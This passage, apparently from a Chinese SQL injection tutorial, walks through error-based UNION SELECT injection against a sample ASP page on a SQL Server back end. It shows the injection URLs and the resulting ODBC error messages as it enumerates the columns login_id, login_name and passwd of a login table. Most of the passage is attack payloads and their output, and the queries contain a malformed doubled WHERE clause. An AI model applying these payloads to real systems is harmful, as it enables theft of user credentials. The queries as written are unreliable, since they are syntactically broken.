    SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value ''login_id
    '' to a column of data type int.

    ```

    `/Index.asp`，第 5 行。从错误信息中知道第一列名为 `''login id ''`。接下来的查询将检索第二个列名：`http://www.nosecurity.com/mypage.asp?id=45
    UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME
    = ''logintable '' WHERE COLUMN_NAME NOT IN ( ''login_id '') -`。


    输出：

    ```

    Microsoft OLE DB Provider for ODBC Drivers error ''80040e07 '' [Microsoft] [ODBC
    SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value ''login_name
    '' to a column of data type int.

    ```

    `/Index.asp`，第 5 行。继续获取第三列名：`http://www.nosecurity.com/mypage.asp?id=45 UNION
    SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ''logintable
    '' WHERE COLUMN_NAME NOT IN ( ''login_id '', ''login_name '') -`。


    输出：

    ```

    Microsoft OLE DB Provider for ODBC Drivers error ''80040e07 '' [Microsoft] [ODBC
    SQL Server Driver] [SQL Server] Syntax error converting the nvarchar value ''passwd
    '' to a column of data type int.

    ```

